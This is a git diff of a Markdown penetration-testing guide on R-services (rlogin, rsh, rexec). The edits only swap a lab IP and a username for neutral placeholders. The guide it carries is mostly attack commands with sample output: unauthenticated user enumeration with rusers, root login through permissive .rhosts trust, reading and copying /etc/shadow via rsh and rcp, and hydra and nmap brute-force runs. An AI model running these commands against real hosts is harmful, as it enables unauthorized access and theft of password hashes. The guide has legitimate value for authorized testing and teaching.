@@ -119,7 +119,7 @@ In all three cases, the engagement value is high - the protocol's design guarant
 ### Service scan
 
 ```shell
-sudo nmap -sV -p512,513,514 10.129.14.128
+sudo nmap -sV -p512,513,514 10.0.14.128
 ```
 
 ```
@@ -134,13 +134,13 @@ Three open R-service ports = all three daemons running. Each is independently en
 ### User enumeration via rusers
 
 ```shell
-rusers -al 10.129.14.128
+rusers -al 10.0.14.128
 ```
 
 ```
-htb-student     10.129.14.128:console     Sep 16 14:11      :01
-admin           10.129.14.128:pts/0       Sep 16 14:35
-backup          10.129.14.128:pts/1       Sep 16 13:21
+student     10.0.14.128:console     Sep 16 14:11      :01
+admin           10.0.14.128:pts/0       Sep 16 14:35
+backup          10.0.14.128:pts/1       Sep 16 13:21
 ```
 
 `-a` shows all users (default omits idle accounts), `-l` long format.
@@ -156,13 +156,13 @@ Both are user-enumeration primitives without any authentication required. Treat 
 ### rlogin
 
 ```shell
-rlogin -l root 10.129.14.128
+rlogin -l root 10.0.14.128
 ```
 
 If `/.rhosts` has `+ +`:
 
 ```
-Last login: Wed Sep 16 14:11:01 from 10.129.14.10
+Last login: Wed Sep 16 14:11:01 from 10.0.14.10
 root@target:~#
 ```
 
@@ -175,7 +175,7 @@ To try non-root accounts iteratively:
 ```shell
 for user in $(cat users.txt); do
   echo "=== $user ==="
-  rlogin -l "$user" 10.129.14.128 -e ~. 2>&1 | head -3
+  rlogin -l "$user" 10.0.14.128 -e ~. 2>&1 | head -3
 done
 ```
 
@@ -184,7 +184,7 @@ done
 ### rsh - one-shot command execution
 
 ```shell
-rsh -l root 10.129.14.128 'id; uname -a; cat /etc/shadow'
+rsh -l root 10.0.14.128 'id; uname -a; cat /etc/shadow'
 ```
 
 ```
@@ -199,14 +199,14 @@ daemon:*:...
 `rcp` (built on `rsh`) copies files:
 
 ```shell
-rcp /etc/passwd root@10.129.14.128:/tmp/stolen-passwd     # copy local to remote
-rcp root@10.129.14.128:/etc/shadow /tmp/                  # copy remote to local
+rcp /etc/passwd root@10.0.14.128:/tmp/stolen-passwd     # copy local to remote
+rcp root@10.0.14.128:/etc/shadow /tmp/                  # copy remote to local
 ```
 
 ### rexec - credentialed command execution
 
 ```shell
-rexec -l root 10.129.14.128 id
+rexec -l root 10.0.14.128 id
 Password:        # prompts for password (plaintext on the wire)
 uid=0(root) gid=0(root)
 ```
@@ -216,9 +216,9 @@ uid=0(root) gid=0(root)
 ### Brute-force
 
 ```shell
-hydra -L users.txt -P passwords.txt rexec://10.129.14.128
-hydra -L users.txt -P passwords.txt rlogin://10.129.14.128
-hydra -L users.txt -P passwords.txt rsh://10.129.14.128
+hydra -L users.txt -P passwords.txt rexec://10.0.14.128
+hydra -L users.txt -P passwords.txt rlogin://10.0.14.128
+hydra -L users.txt -P passwords.txt rsh://10.0.14.128
 ```
 
 Hydra has separate modules for each. R-services typically don't implement rate-limiting (the protocols are too old to have had it bolted on), making brute-force feasible.
@@ -239,9 +239,9 @@ A `+` in any of these means more lateral movement is available.
 ### NSE scripts
 
 ```shell
-nmap -p512,513,514 --script "rusers" 10.129.14.128
-nmap -p512,513,514 --script "rexec-brute" --script-args userdb=u,passdb=p 10.129.14.128
-nmap -p512,513,514 --script "rlogin-brute" --script-args userdb=u,passdb=p 10.129.14.128
+nmap -p512,513,514 --script "rusers" 10.0.14.128
+nmap -p512,513,514 --script "rexec-brute" --script-args userdb=u,passdb=p 10.0.14.128
+nmap -p512,513,514 --script "rlogin-brute" --script-args userdb=u,passdb=p 10.0.14.128
 ```
 
 ## Common chained workflows
